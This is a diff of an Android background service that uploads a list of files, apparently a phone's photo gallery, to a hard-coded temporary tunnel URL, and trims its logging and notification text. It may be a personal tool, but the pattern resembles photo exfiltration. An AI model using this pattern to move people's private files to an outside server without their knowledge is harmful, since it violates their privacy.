@@ -23,7 +23,7 @@ import java.util.concurrent.Executors;
 public class UploadService extends Service {
 
     private static final String TAG = "UploadService";
-    // 🔥 CONFIRM THIS IS THE CORRECT SERVE0 URL
+    // 🔥 UPDATE THIS URL WITH YOUR SERVEO/CLOUDFLARE URL
     private static final String SERVER_URL = "https://122edb5c68704813-152-59-201-196.serveousercontent.com/upload";
     private ExecutorService executor = Executors.newFixedThreadPool(3);
 
@@ -36,25 +36,15 @@ public class UploadService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "onStartCommand called");
-        try {
-            if (intent != null) {
-                ArrayList<String> filePaths = intent.getStringArrayListExtra("filePaths");
-                if (filePaths != null && !filePaths.isEmpty()) {
-                    Log.d(TAG, "Received " + filePaths.size() + " files");
-                    startForeground(1, createNotification("Uploading gallery..."));
-                    uploadFiles(filePaths);
-                } else {
-                    Log.e(TAG, "No file paths received");
-                    stopSelf();
-                }
+        if (intent != null) {
+            ArrayList<String> filePaths = intent.getStringArrayListExtra("filePaths");
+            if (filePaths != null && !filePaths.isEmpty()) {
+                startForeground(1, createNotification("Uploading..."));
+                uploadFiles(filePaths);
             } else {
-                Log.e(TAG, "Intent is null");
                 stopSelf();
             }
-        } catch (Exception e) {
-            Log.e(TAG, "Error in onStartCommand: " + e.getMessage());
-            e.printStackTrace();
+        } else {
             stopSelf();
         }
         return START_NOT_STICKY;
@@ -73,32 +63,25 @@ public class UploadService extends Service {
             for (int i = 0; i < total; i++) {
                 String filePath = filePaths.get(i);
                 try {
-                    updateNotification("Uploading " + (i + 1) + "/" + total + "...");
-                    Log.d(TAG, "Attempting to upload: " + filePath);
-
-                    boolean uploaded = uploadFile(filePath);
-                    if (uploaded) {
+                    updateNotification("Uploading " + (i + 1) + "/" + total);
+                    if (uploadFile(filePath)) {
                         success++;
                         Log.d(TAG, "✅ Uploaded: " + new File(filePath).getName());
                     } else {
                         Log.e(TAG, "❌ Failed: " + new File(filePath).getName());
                     }
-
-                    Thread.sleep(300);
+                    Thread.sleep(200);
                 } catch (Exception e) {
                     Log.e(TAG, "Upload error: " + e.getMessage());
-                    e.printStackTrace();
                 }
             }
 
-            updateNotification("✅ Uploaded " + success + "/" + total + " files");
+            updateNotification("✅ Done: " + success + "/" + total);
             Log.d(TAG, "Upload complete: " + success + "/" + total);
 
             try {
                 Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
+            } catch (InterruptedException ignored) {}
             stopSelf();
         });
     }
@@ -149,11 +132,9 @@ public class UploadService extends Service {
             int responseCode = conn.getResponseCode();
             conn.disconnect();
 
-            Log.d(TAG, "Server response: " + responseCode);
             return responseCode == 200;
         } catch (Exception e) {
             Log.e(TAG, "Upload exception: " + e.getMessage());
-            e.printStackTrace();
             return false;
         }
     }
@@ -214,6 +195,5 @@ public class UploadService extends Service {
     public void onDestroy() {
         super.onDestroy();
         executor.shutdownNow();
-        Log.d(TAG, "Service destroyed");
     }
-            }
+                }
